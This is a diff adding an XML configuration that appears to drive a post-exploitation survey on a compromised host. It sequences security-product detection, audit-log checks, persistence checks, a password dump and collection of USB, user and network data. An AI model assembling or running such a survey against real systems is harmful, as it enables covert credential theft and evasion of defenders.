@@ -1,0 +1,40 @@
+﻿<?xml version="1.0" encoding="utf-8" ?>
+<survey-config version="2">
+    <section name="env-setup">
+        <command prompt="false">systemversion</command>
+        <task module="ops.cmd.safetychecks" name="Load handlers"><args>load</args></task>
+    </section>
+    <section name="pre-danger">
+        <task module="ops.survey.ps" name="Process list"><args>--full-list --start-monitor</args></task>
+        <task module="ops.survey.uptime" name="Uptime" />
+        <task module="ops.survey.auditing" name="Auditing status check"><args>--status-only --maxage 3600</args></task>
+        <task module="ops.survey.driverlist" name="Driver list"><args>-nofreshscan</args></task>
+        <task module="ops.survey.software" name="Software check" />
+        <task module="ops.survey.services" name="Services list" />
+    </section>
+    <section name="danger-checks">
+        <task module="ops.survey.avcheck" name="PSP check" />
+        <task module="ops.survey.auditing" name="Audit dorking"><args>--maxage 3600</args></task>
+        <task module="ops.survey.monitors" name="Start monitors" />
+        <task module="ops.survey.processdeep" name="Process deep" bg="true" />
+        <task module="ops.survey.sigcheck" name="Informational SIG check" bg="true"></task>
+        <task module="ops.survey.scheduler" name="Scheduler check" />
+        <task module="ops.survey.persistence" name="Persistence check" />
+        <configs file="ops/survey.xml" name="Danger check extensions" section="danger-survey" marker="ops::danger-survey extensions" />
+        <task module="ops.cmd.safetychecks" name="Save handlers"><args>save</args></task>
+    </section>
+    <section name="informational">
+        <task module="ops.survey.pwdump" name="Password dump" marker="ops::pwdump" />
+        <task module="ops.survey.osinfo" name="OS info" marker="ops::osinfo" />
+        <task module="ops.survey.networking" name="Networking" marker="ops::networking" />
+        <task module="ops.survey.meminfo" name="Memory info" marker="ops::meminfo" />
+        <task module="ops.survey.diskinfo" name="Disk info" marker="ops::diskinfo" />
+        <task module="ops.survey.usbhistory" name="USB survey" marker="ops::usbsurvey" />
+        <task module="ops.survey.reboothistory" name="Reboot history" marker="ops::reboothistory" />
+        <task module="ops.survey.userinfo" name="User info" marker="ops::userinfo" bg="true" />
+		<task module="ops.survey.extra" name="Extra info to get" marker="ops::extrainfo" bg="True" />
+        <configs file="ops/survey.xml" name="Informational survey extensions" section="info-survey" marker="ops::info-survey extensions" />
+		<task module="ops.survey.diffhour" name="Differential hour" marker="ops::diffhour" />
+		<task module="ops.survey.pccheck" name="PC Check" marker="ops::pccheck" />
+    </section>
+</survey-config>
